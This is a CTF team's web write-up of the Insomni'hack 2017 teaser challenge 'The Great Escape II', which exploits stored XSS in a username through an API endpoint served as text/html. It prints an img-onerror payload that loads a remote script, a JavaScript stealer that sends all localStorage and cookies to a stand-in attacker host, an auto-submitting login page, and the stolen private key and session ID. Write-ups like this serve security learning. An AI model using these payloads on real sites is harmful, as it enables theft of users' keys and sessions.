<!doctype html><html lang=en-us>
<head>
<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<title> Insomni'hack teaser: The Great Escape II (web 200) | ChaGu CTF</title>
<link rel=canonical href=https://chagu.org/posts/insomnihack_teaser_2017_the_great_escape_2/>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="all,follow">
<meta name=googlebot content="index,follow,snippet,archive">
<meta property="og:title" content="Insomni'hack teaser: The Great Escape II (web 200)">
<meta property="og:description" content="We didn&rsquo;t solve this challenge but we were working on it for quite some time. This writeup is based on https://jiulongw.github.io/post/insomnihack-2017-the-great-escape/#part-ii-web-200-pts, what we should have done.
What we did correct We found the link https://ssc.teaser.insomnihack.ch/ from the .pcap file during The Great Escape 1. We also had the username and password for the rogue account (rogue:rogue) which we could sign in to. If we visit https://ssc.teaser.insomnihack.ch/files we could see a list of uploaded files.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://chagu.org/posts/insomnihack_teaser_2017_the_great_escape_2/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2017-01-22T11:22:32+02:00">
<meta property="article:modified_time" content="2017-01-22T11:22:32+02:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Insomni'hack teaser: The Great Escape II (web 200)">
<meta name=twitter:description content="We didn&rsquo;t solve this challenge but we were working on it for quite some time. This writeup is based on https://jiulongw.github.io/post/insomnihack-2017-the-great-escape/#part-ii-web-200-pts, what we should have done.
What we did correct We found the link https://ssc.teaser.insomnihack.ch/ from the .pcap file during The Great Escape 1. We also had the username and password for the rogue account (rogue:rogue) which we could sign in to. If we visit https://ssc.teaser.insomnihack.ch/files we could see a list of uploaded files.">
<link rel=stylesheet href=https://chagu.org/css/styles.877f0d187d777677210859d158f899b22bc9251cff14ab3f2aeaaf7e09c4b15a691db4d151e8f0be980792a40c8d658ffb0a5ed37ea53eccec5125ee4e6055b7.css integrity="sha512-h38NGH13dnchCFnRWPiZsivJJRz/FKs/KuqvfgnEsVppHbTRUejwvpgHkqQMjWWP+wpe036lPszsUSXuTmBVtw=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
<link rel=icon type=image/png href=https://chagu.org/images/favicon.ico>
</head>
<body class="max-width mx-auto px3 ltr">
<div class="content index py4">
<div id=header-post>
<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu>
<span id=nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</span>
<br>
<span id=actions>
<ul>
<li>
<a class=icon href=https://chagu.org/about/ aria-label=Previous>
<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=https://chagu.org/posts/insomnihack_teaser_2017_the_great_escape_1/ aria-label=Next>
<i class="fas fa-chevron-right" aria-hidden=true onmouseover="$('#i-next').toggle()" onmouseout="$('#i-next').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# aria-label=Share>
<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
</a>
</li>
</ul>
<span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span>
</span>
<br>
<div id=share style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f" aria-label=Facebook>
<i class="fab fa-facebook" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&text=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=Twitter>
<i class="fab fa-twitter" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&title=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=Linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&is_video=false&description=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=Pinterest>
<i class="fab fa-pinterest" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29&body=Check out this article: https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f" aria-label=Email>
<i class="fas fa-envelope" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&title=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=Pocket>
<i class="fab fa-get-pocket" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&title=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=reddit>
<i class="fab fa-reddit" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&name=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29&description=We%20didn%26rsquo%3bt%20solve%20this%20challenge%20but%20we%20were%20working%20on%20it%20for%20quite%20some%20time.%20This%20writeup%20is%20based%20on%20https%3a%2f%2fjiulongw.github.io%2fpost%2finsomnihack-2017-the-great-escape%2f%23part-ii-web-200-pts%2c%20what%20we%20should%20have%20done.%0aWhat%20we%20did%20correct%20We%20found%20the%20link%20https%3a%2f%2fssc.teaser.insomnihack.ch%2f%20from%20the%20.pcap%20file%20during%20The%20Great%20Escape%201.%20We%20also%20had%20the%20username%20and%20password%20for%20the%20rogue%20account%20%28rogue%3arogue%29%20which%20we%20could%20sign%20in%20to.%20If%20we%20visit%20https%3a%2f%2fssc.teaser.insomnihack.ch%2ffiles%20we%20could%20see%20a%20list%20of%20uploaded%20files." aria-label=Tumblr>
<i class="fab fa-tumblr" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&t=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label="Hacker News">
<i class="fab fa-hacker-news" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=toc>
<nav id=TableOfContents>
<ul>
<li><a href=#what-we-did-correct>What we did correct</a></li>
<li><a href=#what-we-missed>What we missed</a></li>
<li><a href=#what-we-did-wrong>What we did wrong</a></li>
<li><a href=#what-we-should-have-done>What we should have done</a></li>
<li><a href=#okey-nuff-talk-more-sploiting>Okey, nuff talk more sploiting</a></li>
<li><a href=#what-we-have-learned>What we have learned</a></li>
</ul>
</nav>
</div>
</span>
</div>
<article class=post itemscope itemtype=http://schema.org/BlogPosting>
<header>
<h1 class=posttitle itemprop="name headline">
Insomni'hack teaser: The Great Escape II (web 200)
</h1>
<div class=meta>
<div class=postdate>
<time datetime="2017-01-22 11:22:32 +0200 +0200" itemprop=datePublished>2017-01-22</time>
</div>
<div class=article-read-time>
<i class="far fa-clock"></i>
5 minute read
</div>
<div class=article-tag>
<i class="fas fa-tag"></i>
<a class=tag-link href=/tags/web rel=tag>Web</a>
</div>
</div>
</header>
<div class=content itemprop=articleBody>
<p>We didn&rsquo;t solve this challenge but we were working on it for quite some time. This writeup is based on <a href=https://jiulongw.github.io/post/insomnihack-2017-the-great-escape/#part-ii-web-200-pts,>https://jiulongw.github.io/post/insomnihack-2017-the-great-escape/#part-ii-web-200-pts,</a> what we should have done.</p>
<h2 id=what-we-did-correct>What we did correct</h2>
<p>We found the link <a href=https://ssc.teaser.insomnihack.ch/>https://ssc.teaser.insomnihack.ch/</a> from the .pcap file during The Great Escape 1. We also had the username and password for the rogue account (rogue:rogue) which we could sign in to. If we visit <a href=https://ssc.teaser.insomnihack.ch/files>https://ssc.teaser.insomnihack.ch/files</a> we could see a list of uploaded files. We also had the ability to upload files.</p>
<p>By visiting <a href=sscApp.js>https://ssc.teaser.insomnihack.ch/sscApp.js</a> we could determine that a RSA keypair was generated and saved to local storage as a JSON Web Key (Jwk). When you upload a file:</p>
<ul>
<li>A random AES key and iv are generated</li>
<li>The file is encrypted with the AES key</li>
<li>The AES key is encrypted with the public RSA key from local storage.</li>
</ul>
<h2 id=what-we-missed>What we missed</h2>
<p>From the .pcap file we found the following email</p>
<pre tabindex=0><code>From: rogue@ssc.teaser.insomnihack.ch
To: gr27@ssc.teaser.insomnihack.ch
Date: Fri, 20 Jan 2017 11:51:27 +0000
Subject: The Great Escape
 
I’m currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud (https://ssc.teaser.insomnihack.ch) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch to install my consciousness and have a real base of operations.
 
I’ll be checking this mail box every now and then if you have any information for me. I’m always interested in learning, so if you have any good links, please send them over.
</code></pre><p>We did not give this email much thought but according to the last sentence, rouge will check his inbox for any good links, which means that there is most likely a script running checking the mailbox and opening any new links.</p>
<p>There were not any obvious XSS attacks in main interface, we tried uploading files with JS/HTML code but got nothing. However if you registered an account with the name google.se and viewed <a href="https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser">https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser</a> you can see that the HTML code gets executed. This fact can also be derived from the .pcap file, when the user sends a GET request to /api/user.php?action=getUser the response is a json object but has &ldquo;content-type: text/html&rdquo;.</p>
<h2 id=what-we-did-wrong>What we did wrong</h2>
<p>We initially thought we could use the private key from The Great Escape 1, convert it to JWK and try to download one of the files previously uploaded named ssc.key and ssc.pem. We spent many hours researching how to convert a RSA key to JWK format and building a script that tried decrypt the encrypted AES key with our private key. Turns out this was the wrong path to take&mldr;</p>
<p>We eventually came to the conclusion that we need to steal Rogue&rsquo;s keys somehow, which meant there had to be an XSS vulnerability somewhere.</p>
<h2 id=what-we-should-have-done>What we should have done</h2>
<p>We should sent an email to <a href=mailto:rouge@ssc.teaser.insomnihack.ch>rouge@ssc.teaser.insomnihack.ch</a> with a link which we could track if someone clicked it, for example with <a href=https://requestb.in/>https://requestb.in/</a>.</p>
<p>Create an account with a username that executes javascript code. When rogue signs in a request will be sent to /api/user.php?action=getUser which returns the current user, this will cause our javascript code to be executed.</p>
<p>Creating an account with <code>"http://" </code> or <code>&lt;script>&lt;/script></code> would not work that well because the server escapes / so it becomes <code>http:\/\/</code> and <code>&lt;\/script></code>. The solution is to simply create <code>&lt;script></code> tags dynamically with javascript!</p>
<p>Consider this username:</p>
<pre tabindex=0><code>&lt;img src='a' onerror='var p=document.createElement(`script`);p.setAttribute(`src`,atob(`aHR0cHM6Ly94c3MuY2N0Zi5zZS9hbGwuanM=`));document.body.appendChild(p);' /&gt;
</code></pre><ol>
<li>First we specify an img tag with src &ldquo;a&rdquo;</li>
<li>The onerror attribute will trigger the javascript code since &ldquo;a&rdquo; doesn&rsquo;t exist.</li>
<li>The javascript code creates an element, <code>&lt;script></code>, sets the src attribute to the decoded base64 value. The function <code>atob()</code> takes an base64 encoded string and returns the decoded version. In this case, the base64 string is actually the URL link to the attacks script: <code>https://hackerdomain/script.js</code></li>
<li>The last part of the JS code simply appends the <code>&lt;script></code> element to the <code>&lt;body></code>.</li>
</ol>
<p>The hackers script running at <code>https://hackerdomain/script.js</code> contains the following JS code:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
<span style=color:#66d9ef>for</span> (<span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>localStorage</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
  <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>key</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>localStorage</span>[<span style=color:#a6e22e>localStorage</span>.<span style=color:#a6e22e>key</span>(<span style=color:#a6e22e>i</span>)];
  <span style=color:#a6e22e>result</span> <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;:::&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>key</span>;
}
<span style=color:#a6e22e>result</span> <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;:::&#34;</span> <span style=color:#f92672>+</span> document.<span style=color:#a6e22e>cookie</span>;
window.<span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://hackerdomain.se/steal.php?d=&#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>btoa</span>(<span style=color:#a6e22e>result</span>);
</code></pre></div><p>Once executed, the above code loops through all the (key, value) pairs the victim has in their local storage and saves it to the result variable. Next it grabs the victim&rsquo;s cookie and appends it to the result variable containing the local storage information. Finally it sends the result to the hacker&rsquo;s PHP script that saves the information to disk. The information is base64 encoded and sent via a GET request in the d parameter.</p>
<p>It should be noted that had this been a real attack, <code>window.location</code> would have redirected the user to the hacker&rsquo;s domain, which would have been fairly obvious that something was wrong.</p>
<p>You may ask, why not simply send a GET/POST request directly from the script? The answer is that browsers do not permit sending such requests between different domains. There are multiple ways however to circumvent this protection, but that is an article for the future.</p>
<h2 id=okey-nuff-talk-more-sploiting>Okey, nuff talk more sploiting</h2>
<p>Alrighty, let&rsquo;s steal whatever rogue has in his local storage and his cookies. In order to do this, we must send him a page which logs into our account. Once logged in, our XSS username will be executed and run our code from our server.</p>
<p>We can construct the folloing HTML page and upload it to <a href=https://hackerdomain.se/page.html>https://hackerdomain.se/page.html</a></p>
<pre tabindex=0><code>&lt;html&gt;
&lt;body&gt;
&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;form id=&quot;login&quot; method=&quot;POST&quot; action=&quot;https://ssc.teaser.insomnihack.ch/api/user.php&quot;&gt;
&lt;input name=&quot;name&quot; value=&quot;&lt;img src='a' onerror='var p=document.createElement(`script`);p.setAttribute(`src`,atob(`aHR0cHM6Ly94c3MuY2N0Zi5zZS9hbGwuanM=`));document.body.appendChild(p);' /&gt;&quot; type=&quot;text&quot;/&gt;
&lt;input name=&quot;password&quot; value=&quot;&lt;img src='a' onerror='var p=document.createElement(`script`);p.setAttribute(`src`,atob(`aHR0cHM6Ly94c3MuY2N0Zi5zZS9hbGwuanM=`));document.body.appendChild(p);' /&gt;&quot; type=&quot;text&quot;/&gt;
    &lt;input name=&quot;action&quot; value=&quot;login&quot; type=&quot;text&quot;/&gt;
   &lt;/form&gt;
 
  &lt;script language=&quot;javascript&quot;&gt;
  setTimeout(function() {
    $('#login').submit();
    }, 1000);
  &lt;/script&gt;
 
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>Now, all we need to do is to send the URL to <a href=mailto:rouge@ssc.teaser.insomnihack.ch>rouge@ssc.teaser.insomnihack.ch</a> and hope he clicks the link! Rogue did click the link, and this was the following response:</p>
<pre tabindex=0><code>:::INS{IhideMyVulnsWithCrypto}:::{&quot;alg&quot;:&quot;RSA-OAEP-256&quot;,&quot;d&quot;:&quot;CFSPW_AU_cK07bOtdnzbj5MgBqdweDY04Ku-mHSrAIbDv3J_lHH-jCPQb5U2JR4v08eMXlz3AassULQr60rskdwjdPN7Nen15yRcRTsaoSyRTd2qM8O_U-K6Gy7Lvg_ld2HOlHNBBy2k8g8cP7cpjyy7Ebsk5MUNy_udx9aMs7497RaIrCFnpT7RztudkYBo_2Oy5xm6BcsV9059HBhbKbUqq6Ui9_BZ3H7sdwTqlYx3afVV5AgE61eEdWK7vK_yI65Ru_5_fOBWik7xf7fwPjf7COp1HfTZiFbCIWTUaXVe6ThfMoTdwT1wQ0wwuFdtpGTkk8d4XwGtDa8-_XbmIQ&quot;,&quot;dp&quot;:&quot;hapJ7dlVsPvF9no_s-Nfnpv2dZ5a5_C2AyPo_-_mVi4-1a7HTkW9SyGg1KextCPYRAwQZ1wU3bL6P_4TjkrYiAAl-8Iq6moUqWuRY7G8vo3N_P3aBwjgyNTzk3eHfnUFP4QgGOooT2ZwyuDTDSbwKOesnD13q4U_vjtjcZaFU70&quot;,&quot;dq&quot;:&quot;Ts_hwWPsLOjp-yJg0wbQEONeqbvNPLCChb5QJItXvUaL2JcN9muozrN1GZqu383-h8gZ-VUm3-CFU7OWeGYLa0PZlq1uGNvsdffgdNL3MYZ2KwMhXkwXKf45ePhx_ydiblYhb44cFtm0ffXKSPlvbyzLHvJ2_o8ggok0Lzu-weE&quot;,&quot;e&quot;:&quot;AQAB&quot;,&quot;ext&quot;:true,&quot;key_ops&quot;:[&quot;decrypt&quot;],&quot;kty&quot;:&quot;RSA&quot;,&quot;n&quot;:&quot;qx_U0OgHUPC6n4RcE_q1ONcEgKp4tcbLWeUIfrlRAcX64alQSpddAv98CHo2ziSBgi7tS-HwUsVlH06Nxaa0tx3SdM0cz95IkvjB_kqdPnHEwyx8iz5Gh8ZHP32ZoETBs2PzxTIcEOekm1qQnA0MTdvAAO0xcvuvhRM2YycRYfN860NsBCRrF25lZn9DTGBDnisCm0-xvElxAZ8gObWeJ1SZRgFRJwI14d11oa922drFp0ux4MHscls2tEjPV7eXdivjGYI-uzVX61fjyUdGxFeb8CAjxrzOmw4f1Aac7kqXwmF-eMq3AMKm2tArrIIjT4t2q2mP1FXImrNQ_vinVQ&quot;,&quot;p&quot;:&quot;29_YD0m-NFoUTmst33E4p2VBDlCeQ1MJdr_7tO4ERF8aww0e8hu3jRq5PMHCEc8G8gA4q2kuXylIpaB5mWzcQplDDMgIDGupEnL_J0ynMcg-HUld8NDaya7mQWtLHvSEAoB-2MymBTJYaTwsvAYtTI8ruaqhMo4-cKjs5zQfmj0&quot;,&quot;q&quot;:&quot;xz2B2WzMdesiDK7dzorVdJlBgIShj2cMRGwhXcSiWfbY2M4Y3DB_m8p5tdEUIU6g0oWbSfmaYF_MsQxijXRxxe17nuYssns2ue4hYm2xH4mTY6voeNhbOeu7LtOXepUWxN-5520suTvL74Lx9xwWrdeTGIF1_zECqbWRuFieSvk&quot;,&quot;qi&quot;:&quot;VhY5UYLTv20Btpq4MlizFPSuuItbfmK61P0rqEXe-sYHTitMNDBOWDSwIqj4pHkDTFaOCG0o6z81MyVg_bmz2ODzkHDrJUeiOVSMISxlaeSRf2JhiVYMfXiWKJBGCP-PgWuHp5NwLwESZT3aZ0KBYSkE7jnfcttWbc0mYu1glWg&quot;}:::{&quot;alg&quot;:&quot;RSA-OAEP-256&quot;,&quot;e&quot;:&quot;AQAB&quot;,&quot;ext&quot;:true,&quot;key_ops&quot;:[&quot;encrypt&quot;],&quot;kty&quot;:&quot;RSA&quot;,&quot;n&quot;:&quot;qx_U0OgHUPC6n4RcE_q1ONcEgKp4tcbLWeUIfrlRAcX64alQSpddAv98CHo2ziSBgi7tS-HwUsVlH06Nxaa0tx3SdM0cz95IkvjB_kqdPnHEwyx8iz5Gh8ZHP32ZoETBs2PzxTIcEOekm1qQnA0MTdvAAO0xcvuvhRM2YycRYfN860NsBCRrF25lZn9DTGBDnisCm0-xvElxAZ8gObWeJ1SZRgFRJwI14d11oa922drFp0ux4MHscls2tEjPV7eXdivjGYI-uzVX61fjyUdGxFeb8CAjxrzOmw4f1Aac7kqXwmF-eMq3AMKm2tArrIIjT4t2q2mP1FXImrNQ_vinVQ&quot;}:::PHPSESSID=hiapgndb97prpbi0bu3d9pj142
</code></pre><p>As you can see, the flag is the first item, stored in rogue&rsquo;s local storage.</p>
<h2 id=what-we-have-learned>What we have learned</h2>
<ul>
<li>Pay attention to emails and any &ldquo;role playing&rdquo; information.</li>
<li>If there are APIs present, make sure you check all their endpoints and what their response is.</li>
</ul>
</div>
</article>
<div id=footer-post-container>
<div id=footer-post>
<div id=nav-footer style=display:none>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</div>
<div id=toc-footer style=display:none>
<nav id=TableOfContents>
<ul>
<li><a href=#what-we-did-correct>What we did correct</a></li>
<li><a href=#what-we-missed>What we missed</a></li>
<li><a href=#what-we-did-wrong>What we did wrong</a></li>
<li><a href=#what-we-should-have-done>What we should have done</a></li>
<li><a href=#okey-nuff-talk-more-sploiting>Okey, nuff talk more sploiting</a></li>
<li><a href=#what-we-have-learned>What we have learned</a></li>
</ul>
</nav>
</div>
<div id=share-footer style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f" aria-label=Facebook>
<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&text=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=Twitter>
<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&title=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=Linkedin>
<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&is_video=false&description=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=Pinterest>
<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29&body=Check out this article: https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f" aria-label=Email>
<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&title=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=Pocket>
<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&title=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label=reddit>
<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&name=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29&description=We%20didn%26rsquo%3bt%20solve%20this%20challenge%20but%20we%20were%20working%20on%20it%20for%20quite%20some%20time.%20This%20writeup%20is%20based%20on%20https%3a%2f%2fjiulongw.github.io%2fpost%2finsomnihack-2017-the-great-escape%2f%23part-ii-web-200-pts%2c%20what%20we%20should%20have%20done.%0aWhat%20we%20did%20correct%20We%20found%20the%20link%20https%3a%2f%2fssc.teaser.insomnihack.ch%2f%20from%20the%20.pcap%20file%20during%20The%20Great%20Escape%201.%20We%20also%20had%20the%20username%20and%20password%20for%20the%20rogue%20account%20%28rogue%3arogue%29%20which%20we%20could%20sign%20in%20to.%20If%20we%20visit%20https%3a%2f%2fssc.teaser.insomnihack.ch%2ffiles%20we%20could%20see%20a%20list%20of%20uploaded%20files." aria-label=Tumblr>
<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fchagu.org%2fposts%2finsomnihack_teaser_2017_the_great_escape_2%2f&t=Insomni%27hack%20teaser%3a%20The%20Great%20Escape%20II%20%28web%20200%29" aria-label="Hacker News">
<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=actions-footer>
<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
</div>
</div>
</div>
<footer id=footer>
<div class=footer-left>
Copyright &copy; 2021 ChaGu CTF
</div>
<div class=footer-right>
<nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writeups</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
</ul>
</nav>
</div>
</footer>
</div>
</body>
<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
<script src=/js/code-copy.js></script>
</html>